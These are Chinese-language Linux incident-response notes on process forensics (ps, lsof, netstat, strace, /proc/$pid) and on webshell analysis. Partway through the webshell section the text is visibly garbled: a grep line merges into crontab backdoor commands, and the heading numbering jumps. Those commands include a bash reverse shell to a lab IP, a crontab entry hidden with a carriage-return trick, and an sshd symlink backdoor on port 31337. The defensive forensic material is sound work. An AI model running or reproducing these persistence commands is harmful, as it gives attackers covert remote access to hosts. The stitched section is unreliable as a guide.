[TOC]
# 0x07 进程分析
## 1 进程基本信息获取
```shell
# 查看系统内的进程列表并给出相应的基本信息
ps -ef
ps auxfww #能看到启动该进程时输入的命令
# 查看某进程的线程
ps -Lf $pid
# 查看父子进程树
pstree
# 其他
htop || top
```
## 2 进程与网络
### 2.1 知端口找进程
```shell
lsof -i:80 #得pid
pstree -p $pid #得进程树
```
```shell
netstat -ntaup|grep $port #得pid，等效于ss -ntaup|grep $port 
ps axu|grep $pid #得进程
```
### 2.2 知进程找端口
```shell
ps aux|grep $proc_name 查看第二列获得pid
netstat -ntaup|grep $pid
```
### 2.3 知进程找raw_socket
常规的网络通信流量都是基于TCP/UDP实现的，基本都处于传输层及应用层。然而在网络攻击场景下，部分攻击者为了达到躲避隐藏的目的，会让失陷主机通过诸如ICMP这样的网络层协议与攻击机进行通信，这时可以过滤系统内绑定了原始套接字（sock_raw）的进程进行分析。
```shell
netstat -awp
ss -awp
#或者
lsof | grep raw
```
## 3 进程与命令
```shell
ps auxfww|grep $pid
cat /proc/$pid/cmdline|xxd
```
## 4 进程与文件
### 4.1 查看启动进程的二进制文件
使用ps
```shell
#最后一列获得命令文件的路径，可能是相对路径，需要whereis或find一下。
ps auxfww
```
使用readlink
```
readlink /proc/${pid}/exe
```
+ ps: 定位文件后常要进一步分析是否被篡改或有恶意行为
### 4.2 查看进程访问的文件
```shell
lsof -p $pid
#FD列为r/u/w的代表读写操作，txt为程序绝对路径，cwd为目录，mem为使用的库文件
ls -al /proc/$pid/fd/
# 都是软链接，软链接指向的信息给出了进程占用的文件。
lsof $filename
ps aux|grep $pid
#定位占用某文件的进程
```
## 5 进程与函数调用
```shell
#使用以下工具可以查看到进程生命周期中调用的一些系统库函数，这些函数能帮助初步识别进程的行为与功能。
strace -p $pid
ltrace -p $pid
```
## 6 /proc/$pid
/proc/$pid/下记录了某个进程获取及分配的各种资源。这些资源在取证及文件恢复时有很大作用。
```
/proc/$pid/cmdline：指示创建当前进程时输入的命令
/proc/$pid/cwd：指示启动该进程时所处的目录
/proc/$pid/environ：指示进程运行时的环境变量
/proc/$pid/exe:是进程依赖的二进制的软链接。
/proc/$pid/root：指示系统根目录的软链接。一般为/。
/proc/$pid/fd：进程运行中申请的所有所有文件描述符。包括普通文件读写，标准输入输出错误，管道以及socket。
/proc/$pid/mem：内存空间，不能直接看，要通过maps，map_file/*进行辅助分析。
/proc/$pid/maps：进程分配的内存表。可以当作是map_files的索引文件。文件名是一段地址范围。
/proc/$pid/maps_files:包括maps指示的各地址段的内存映像。可以进行关键字搜索或逆向分析。
/proc/$pid/stacks：当前时刻主线程函数调用栈。
/proc/$pid/task：当前时刻子线程函数调用栈。
```
# 0x08 webshell 分析
## 1 常用webshell专杀工具
D盾 http://www.d99net.net/down/d_safe_2.1.5.4.zip
河马webshell查杀 https://www.shellpub.com/
安全狗 http://free.safedog.cn/website_safedog.html
## 2 目录手工分析
```shell
# 下面两条适合对上传目录的粗筛
grep -rn "php\|& /dev/tcp/192.168.44.128/2333 0>&1"; } | crontab -
(crontab -l;printf "*/1 * * * * bash -i >& /dev/tcp/192.168.44.128/5555 0>&1;\rno crontab for `whoami`%100c\n")|crontab -
echo ' * */5 * * * root ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337' >> /etc/crontab
```
### 1.3 服务型后门
#### 1.3.1 systemd后门
参考 0x06 自启动任务排查，关注以下目录中是否存在后门指令。